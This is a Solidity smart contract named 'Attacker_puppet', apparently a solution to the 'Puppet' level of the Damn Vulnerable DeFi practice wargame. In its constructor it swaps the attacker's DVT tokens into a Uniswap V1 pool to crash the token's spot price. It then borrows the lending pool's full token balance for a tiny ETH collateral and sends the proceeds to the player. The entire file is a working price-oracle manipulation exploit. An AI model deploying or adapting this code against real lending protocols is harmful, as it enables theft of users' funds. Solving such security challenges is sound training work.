// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./UniswapV1Interface.sol";
import "./PuppetPool.sol";

contract Attacker_puppet {
    DamnValuableToken public dvt;
    UniswapExchangeInterface public uniswapExchange;
    PuppetPool public lending_pool;

    constructor(
        DamnValuableToken _token,
        UniswapExchangeInterface _exchange,
        PuppetPool _lending_pool
    ) payable {
        dvt = _token;
        dvt.transferFrom(
            msg.sender,
            address(this),
            dvt.balanceOf(address(msg.sender))
        );
        uniswapExchange = _exchange;
        lending_pool = _lending_pool;
        attack(address(msg.sender));
    }

    function attack(address player) internal {
        dvt.approve(address(uniswapExchange), dvt.balanceOf(address(this)));
        uniswapExchange.tokenToEthSwapInput(
            dvt.balanceOf(address(this)),
            1,
            block.timestamp + 1000
        );

        uint256 requiredDeposit = lending_pool.calculateDepositRequired(
            dvt.balanceOf(address(lending_pool))
        );
        lending_pool.borrow{value: requiredDeposit}(
            dvt.balanceOf(address(lending_pool)),
            player
        );
    }
}
